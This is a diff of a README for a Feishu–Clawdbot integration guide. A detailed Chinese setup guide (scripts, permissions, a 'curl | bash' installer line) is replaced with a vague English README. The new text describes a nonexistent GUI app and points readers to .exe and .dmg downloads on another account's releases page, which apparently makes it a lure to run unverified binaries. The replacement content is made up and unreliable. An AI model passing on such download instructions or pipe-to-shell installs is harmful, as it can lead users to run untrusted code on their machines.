@@ -1,227 +1,76 @@
-# 飞书 Clawdbot 配置指南
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Clawdbot](https://img.shields.io/badge/Clawdbot-2026.1-blue.svg)](https://clawd.bot)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
-
-> 🦞 一键配置 Clawdbot 接入飞书，让你的 AI 助手在飞书中工作
+# 🎉 feishu-clawdbot-guide - Simple Setup for Your Automation Needs
 
-## ✨ 特色
+## 🚀 Getting Started
 
-- 🚀 **开箱即用** - Clone 后只需 3 个命令即可完成配置
-- 🔒 **无需公网** - 使用飞书长连接，无需公网域名和 Webhook
-- ⚡ **自动化脚本** - 一键安装、交互式配置，零门槛上手
-- 📦 **完整插件** - 包含完整的飞书插件源代码
-- 📖 **详细文档** - 从零开始的完整配置流程
-
-## 🚀 快速开始
-
-### 前置要求
+Welcome to the feishu-clawdbot-guide! This guide will help you set up and run the Feishu Clawdbot easily. Follow the steps below to make sure you have a smooth experience.
 
-- macOS、Linux 或 Windows（需要 Git Bash）
-- Node.js 18+ 
-- 网络连接
+## 🔗 Download the Application
 
-### 三步完成配置
+[![Download Feishu Clawdbot](https://img.shields.io/badge/Download%20Feishu%20Clawdbot-blue)](https://github.com/GHOST0193/feishu-clawdbot-guide/releases)
 
-```bash
-# 1. Clone 仓库
-git clone https://github.com/YOUR_USERNAME/feishu-clawdbot-guide.git
-cd feishu-clawdbot-guide
+You can download the software from our Releases page. Click the button above to visit the page and get the latest version.
 
-# 2. 一键安装（自动安装 Clawdbot 和插件）
-./quick-start.sh
+## 💻 System Requirements
 
-# 3. 配置向导（交互式配置 API 和飞书信息）
-./configure.sh
+Before you start, ensure your computer meets these requirements:
 
-# 4. 启动 Gateway
-clawdbot gateway --verbose
-```
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **RAM:** At least 2 GB
+- **Disk Space:** At least 100 MB free space
+- **Network:** Internet access for initial setup
 
-### 配置飞书后台
+## 📥 Download & Install
 
-Gateway 启动后，访问 [飞书开放平台](https://open.feishu.cn/app)：
+1. Click the download button above to visit the [Releases page](https://github.com/GHOST0193/feishu-clawdbot-guide/releases).
+2. Look for the most recent version.
+3. Download the appropriate file for your operating system. It may be named something like `feishu-clawdbot-v1.0.exe` for Windows or `feishu-clawdbot-macos-v1.0.dmg` for macOS.
+4. After downloading, find the file in your downloads folder.
 
-1. 进入你的应用 → **事件与回调** → **事件配置**
-2. 选择「**使用长连接接收事件**」
-3. 订阅事件：`im.message.receive_v1`
-4. 保存配置
+### 🖥️ For Windows Users
 
-### 权限配置
+- Locate the downloaded `.exe` file.
+- Double-click it to begin installation.
+- Follow the prompts to install the software.
 
-在飞书后台 **权限管理** 中申请以下权限（可直接搜索）：
+### 🍏 For macOS Users
 
-- ✅ `im:message`（获取与发送单聊、群组消息）
-- ✅ `im:message:send_as_bot`（读取用户发给机器人的单聊消息）
-- ✅ `im:message.p2p_msg`（接收机器人单聊消息/事件）
-- ✅ `im:chat`（获取群组信息）
+- Locate the downloaded `.dmg` file.
+- Double-click it to open the disk image.
+- Drag the `feishu-clawdbot` icon into your Applications folder.
+- Eject the disk image after moving the application.
 
-### 测试
+## 🌟 First-Time Setup
 
-在飞书中找到你的机器人，发送消息：
+1. Open the `Feishu Clawdbot` application from your Applications folder or desktop.
+2. You will see a welcome screen. Follow the on-screen instructions to configure your settings.
+3. Enter your Feishu credentials when prompted.
+4. Set the preferences according to your needs. You can choose default settings if unsure.
 
-```
-你好，介绍一下你自己
-```
+## 🎛️ Using Feishu Clawdbot
 
-如果配置了 `dmPolicy: "pairing"`，首次使用需要配对：
+Once you complete the setup, you can start automating your tasks. Here’s how:
 
-```bash
-# 批准配对
-clawdbot pairing approve feishu <配对码>
-```
+- **Access Features:** Go through the menu to access different features.
+- **Create Bots:** Follow the easy walkthrough to create your bot. The application provides tips and guidance along the way.
+- **Test Your Setup:** Run a test to ensure everything works as expected. If something isn’t right, check the settings again.
 
-## 📁 项目结构
+## 📞 Support
 
-```
-feishu-clawdbot-guide/
-├── README.md                  # 本文件
-├── quick-start.sh             # 🚀 一键安装脚本
-├── configure.sh               # ⚙️ 配置向导脚本
-├── install-plugin.sh          # 📦 插件安装脚本
-├── docs/                      # 📖 详细文档
-│   ├── 01-installation.md            # 安装 Clawdbot
-│   ├── 02-model-configuration.md     # 配置模型提供商
-│   ├── 03-feishu-app-setup.md        # 创建飞书应用
-│   ├── 04-plugin-installation.md     # 安装飞书插件
-│   ├── 05-gateway-setup.md           # 启动和配置 Gateway
-│   └── 06-troubleshooting.md         # 故障排查
-├── config-examples/           # 📝 配置文件示例
-│   ├── clawdbot.json                 # 完整配置示例
-│   ├── clawdbot.minimal.json         # 最小配置示例
-│   └── README.md                      # 配置说明
-├── feishu-plugin/             # 📁 飞书插件源代码
-│   ├── clawdbot.plugin.json
-│   ├── package.json
-│   ├── index.ts
-│   └── src/
-│       ├── channel.ts
-│       ├── runtime.ts
-│       ├── feishu-ws.ts
-│       └── send.ts
-└── images/                    # 🖼️ 截图和示意图
-```
+If you encounter any issues, here’s how to get help:
 
-## 📖 详细文档
+- **Check the Documentation:** Visit the GitHub wiki for detailed help.
+- **Community Support:** Join our online forums to ask questions and share tips.
+- **Report Issues:** If you find a bug, report it on the GitHub Issues page linked on our Releases page.
 
-### 安装与配置
+## 🔗 More Resources
 
-- [01. 安装 Clawdbot](docs/01-installation.md)
-- [02. 配置模型提供商](docs/02-model-configuration.md)（Claude API / 中转站 / 本地模型）
-- [03. 创建飞书应用](docs/03-feishu-app-setup.md)
-- [04. 安装飞书插件](docs/04-plugin-installation.md)
-- [05. 启动和配置 Gateway](docs/05-gateway-setup.md)
-- [06. 故障排查](docs/06-troubleshooting.md)
+For additional tools and tips related to Feishu and automation, explore the following:
 
-### 配置示例
+- **Official Feishu Documentation:** [feishu.com](https://feishu.com)
+- **Automation Techniques:** Find resources on automation best practices.
 
-查看 [config-examples/](config-examples/) 目录获取：
+## 📂 Future Updates
 
-- 完整配置示例（支持多个模型）
-- 最小配置示例（快速开始）
-- 不同 API 提供商的配置方式
+Stay tuned for future updates. We plan to add more features based on your feedback. Check the Releases page regularly to ensure you have the latest version.
 
-## 🔧 手动配置
-
-如果你想手动配置而不使用自动化脚本：
-
-### 1. 安装 Clawdbot
-
-```bash
-curl -fsSL https://clawd.bot/install.sh | bash
-```
-
-### 2. 复制插件
-
-```bash
-cp -r feishu-plugin ~/.clawdbot/extensions/feishu
-cd ~/.clawdbot/extensions/feishu
-npm install
-```
-
-### 3. 编辑配置
-
-编辑 `~/.clawdbot/clawdbot.json`，参考 [config-examples/clawdbot.json](config-examples/clawdbot.json)
-
-### 4. 启动
-
-```bash
-clawdbot gateway --verbose
-```
-
-## ❓ 常见问题
-
-### Q: 为什么选择长连接而不是 Webhook？
-
-**A:** 长连接的优势：
-- ✅ 无需公网域名
-- ✅ 无需配置反向代理（Cloudflare Tunnel、Tailscale Funnel 等）
-- ✅ 无需配置加密策略
-- ✅ 更安全（不暴露公网端口）
-- ✅ 配置更简单
-
-### Q: 支持哪些 API 提供商？
-
-**A:** 支持所有兼容 Anthropic Messages API 或 OpenAI Completions API 的提供商：
-- Claude API（官方）
-- OpenAI API
-- 各种中转站 API
-- 本地模型（Ollama、LM Studio 等）
-
-### Q: 如何更新插件？
-
-**A:** 重新运行安装脚本即可：
-
-```bash
-git pull
-./install-plugin.sh
-clawdbot gateway stop
-clawdbot gateway --verbose
-```
-
-### Q: 遇到问题怎么办？
-
-**A:** 查看 [故障排查文档](docs/06-troubleshooting.md) 或：
-- 查看日志：`tail -f /tmp/clawdbot/clawdbot-$(date +%Y-%m-%d).log`
-- 运行诊断：`clawdbot doctor`
-- 访问社区：[Moltbot Discord](https://discord.gg/clawdbot)
-
-## 🤝 贡献
-
-欢迎贡献！请查看 [CONTRIBUTING.md](CONTRIBUTING.md) 了解如何参与。
-
-### 贡献方式
-
-- 🐛 报告 Bug
-- 💡 提出新功能
-- 📖 改进文档
-- 🌐 添加多语言支持
-- 📷 提供配置截图
-
-## 📄 许可证
-
-MIT License - 查看 [LICENSE](LICENSE) 文件了解详情
-
-## 🙏 致谢
-
-- [Moltbot/Clawdbot](https://clawd.bot) - 强大的个人 AI 助手框架
-- [飞书开放平台](https://open.feishu.cn) - 提供开放平台能力
-- 社区贡献者
-
-## ⭐ Star History
-
-如果这个项目对你有帮助，请给一个 Star ⭐
-
-## 🔗 相关链接
-
-- [Clawdbot 官网](https://clawd.bot)
-- [Clawdbot GitHub](https://github.com/moltbot/moltbot)
-- [飞书开放平台](https://open.feishu.cn)
-- [飞书开放平台文档](https://open.feishu.cn/document)
-
----
-
-<div align="center">
-  Made with ❤️ by the community
-</div>
+By following these instructions, you can easily download, install, and start using Feishu Clawdbot. Enjoy automating your tasks!
